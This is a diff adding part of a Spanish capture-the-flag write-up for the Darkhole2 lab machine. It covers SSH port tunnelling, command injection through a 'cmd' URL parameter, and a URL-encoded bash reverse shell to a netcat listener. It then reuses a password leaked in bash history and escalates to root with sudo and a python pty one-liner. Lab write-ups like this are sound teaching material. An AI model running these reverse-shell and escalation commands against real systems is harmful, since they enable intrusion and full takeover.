@@ -132,6 +132,70 @@ Aquí podemos ver que un servidor web se está ejecutando en el puerto 9999. Cua
 
     cat /etc/crontab
 
+Por lo tanto, podemos tunelizar el puerto 9999 usando SSH de la siguiente manera.
 
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/114f1fdc-9351-4819-82fa-3deaad1243f6)
 
+Ha llegado el momento de lanzar este asalto. Intentamos iniciar sesión como el usuario jehad, utilizando los detalles del reenvío de puertos locales proporcionados en los resultados anteriores que obtuvimos.
 
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/51057c2c-55c0-431d-9b7f-74c05d631591)
+
+    ssh -L 9999:127.0.0.1:9999 jehad@192.168.40.133
+
+Luego, podría visitar 127.0.0.1:9999 para el RCE.
+
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/d2d24d1f-ac23-4737-b236-7b3fd5a142d3)
+
+    http://127.0.0.1:9999/?cmd=id
+
+Ahora, podemos obtener un reverse shell con el usuario losy. Para eso, estoy escuchando en el puerto 9001.
+
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/imagenes/shellr.jpg)
+
+    nc -nlvp 9001
+
+El siguiente payload me daría un reverse shel.
+
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+En formato url   &->%26  (URL encode)
+
+    bash -c 'bash -i >%26 /dev/tcp/192.168.40.128/9001 0>%26
+
+Mandamos el payload cambiando id por el cofificado en URL previamente realizado en el paso anterior. 'http://127.0.0.1:9999/?cmd=id'
+  
+    http://127.0.0.1:9999/?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.40.128/9001 0>%261'
+
+Obtenemos respuesta del Puerto de escucha:
+
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/61540892-f8c6-4f7b-9935-4cbe60706754)
+
+~~~~
+cd
+ls -la
+cat user.txt
+cat.bash history
+~~~
+
+Descubrimos las credenciales de inicio de sesión de losy en este archivo de historial de bash.
+
+    losy: gang
+
+Después de eso, probamos los permisos sudo de este usuario. Descubrimos que podíamos llegar a la raíz usando una sola línea de python
+
+~~~
+sudo –S –l
+gang
+~~~
+
+Ahora ejecuta este one-liner de python con sudo y la credencial losy.
+
+![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/d4a26c9c-18d0-470f-a940-eba826879334)
+
+~~~
+sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
+cd
+cat root.txt
+~~~
+
+Obtuvimos usuario root con acceso a la raiz
